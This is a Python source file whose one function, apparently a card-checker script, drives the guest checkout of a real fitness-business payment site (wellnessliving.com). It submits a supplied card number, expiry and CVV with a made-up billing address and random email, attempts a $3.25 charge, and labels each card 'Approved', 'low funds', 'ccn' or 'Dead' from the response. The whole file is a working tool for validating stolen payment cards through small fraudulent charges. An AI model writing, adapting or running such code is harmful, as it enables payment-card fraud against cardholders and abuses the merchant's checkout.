from utilsdf.functions import  capture, random_email
from httpx import AsyncClient


async def adriana(cc, month, year, cvv):

    async with AsyncClient(
        follow_redirects=True, verify=False, 
    ) as session:
        year = year[2:]

        r = await session.get(
            "https://www.wellnessliving.com/rs/catalog-view.html?k_business=336258&id_sale=4&k_id=2217388",
        )

        h2 = {
            "Host": "www.wellnessliving.com",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "referer": "https://www.wellnessliving.com/rs/catalog-view.html?k_business=336258&id_sale=4&k_id=2217388",
        }

        r2 = await session.get(
            "https://www.wellnessliving.com/rs/catalog-payment.html?k_id=6943556&sid_purchase_item=product&k_location=244894",
            headers=h2,
        )

        h3 = {
            "Host": "www.wellnessliving.com",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "referer": "https://www.wellnessliving.com/rs/catalog-payment.html?k_id=6943556&sid_purchase_item=product&k_location=244894",
        }

        r3 = await session.get(
            "https://www.wellnessliving.com/rs/catalog-payment.html?k_id=6943556&k_business=336258&k_location=244894&is_continue_as_guest=1",
            headers=h3,
        )
        t3 = r3.text
        rs = capture(t3, '"rs-catalog-payment" value="', '"')

        h4 = {
            "Host": "www.wellnessliving.com",
            "accept": "application/json, text/javascript, */*; q=0.01",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "origin": "https://www.wellnessliving.com",
            "referer": "https://www.wellnessliving.com/rs/catalog-payment.html?k_id=6943556&k_business=336258&k_location=244894&is_continue_as_guest=1",
        }

        p4 = f"rs-catalog-payment={rs}&_filter=&s_mail=&s_password=&s_password2=&a_pay_form%5B0%5D%5Bsid_pay_method%5D=ecommerce&a_pay_form%5B0%5D%5Bk_pay_method%5D=&a_pay_form%5B0%5D%5Bf_amount%5D=3.25&a_pay_form%5B0%5D%5Bm_surcharge%5D=0.03&a_pay_form%5B0%5D%5Ba_pay_card%5D%5Bk_pay_bank%5D=&a_pay_form%5B0%5D%5Ba_pay_card%5D%5Bs_number%5D={cc}&s_card_system=%7B%22visa%22%3A12%2C%22mastercard%22%3A8%2C%22american-express%22%3A1%2C%22discover%22%3A5%7D&a_pay_form%5B0%5D%5Ba_pay_card%5D%5Bi_csc%5D={cvv}&a_pay_form%5B0%5D%5Ba_pay_card%5D%5Bi_month%5D={month}&a_pay_form%5B0%5D%5Ba_pay_card%5D%5Bi_year%5D={year}&k_pay_address_selected=&a_pay_form%5B0%5D%5Ba_pay_card%5D%5Ba_pay_address%5D%5Bk_pay_address%5D=0&a_pay_form%5B0%5D%5Ba_pay_card%5D%5Ba_pay_address%5D%5Bs_name%5D=Sachio+YT&a_pay_form%5B0%5D%5Ba_pay_card%5D%5Ba_pay_address%5D%5Bs_street1%5D=118+W+132nd+St&a_pay_form%5B0%5D%5Ba_pay_card%5D%5Ba_pay_address%5D%5Bs_street2%5D=&a_pay_form%5B0%5D%5Ba_pay_card%5D%5Ba_pay_address%5D%5Bs_city%5D=New+York&a_pay_form%5B0%5D%5Ba_pay_card%5D%5Ba_pay_address%5D%5Bs_postal%5D=10027&a_pay_form%5B0%5D%5Ba_pay_card%5D%5Ba_pay_address%5D%5Bk_geo_country%5D=6895&a_pay_form%5B0%5D%5Ba_pay_card%5D%5Ba_pay_address%5D%5Bk_geo_region%5D=6927&a_pay_form%5B0%5D%5Ba_pay_card%5D%5Ba_pay_address%5D%5Bs_phone%5D=%2B51900654225&a_pay_form%5B0%5D%5Ba_pay_card%5D%5Ba_pay_address%5D%5Bis_new%5D=1&a_pay_form%5B0%5D%5Ba_pay_card%5D%5Bs_encrypt%5D=&a_pay_form%5B0%5D%5Ba_pay_card%5D%5Bis_new%5D=1&a_pay_form%5B0%5D%5Bs_comment%5D=&a_pay_form%5B0%5D%5Bpa%5D%5Bk_pay_transaction%5D=&a_pay_form%5B0%5D%5Bpa%5D%5Bm_amount%5D=&a_pay_form%5B0%5D%5Bpa%5D%5Bjson_data%5D=&a_pay_form%5B0%5D%5Bpa%5D%5Bjson_log%5D=&is_pay=&is_agreement=1&is_register=1&text_guest_email={random_email()}&a-ajax=1"

        r4 = await session.post(
            "https://www.wellnessliving.com/rs/catalog-payment.html?a-ajax=1&k_id=6943556&k_business=336258&k_location=244894",
            headers=h4,
            data=p4,
        )
        t4 = r4.text
        with open("pepe.html", "w", encoding='utf-8') as f:
            f.write(t4)
        msg = capture(t4, '"s_message":"', '"')

        if r4.status_code == 302:
            status = "Approved! ✅ -» charged!"
            msg = "Thanks -» $3"
        elif "Insufficient Funds." in msg:
            status = "Approved! ✅ -» low funds"
        elif "Invalid Card Number." in msg:
            status = "Approved! ✅ -» ccn"
        else:
            status = "Dead! ❌"

        return status, msg
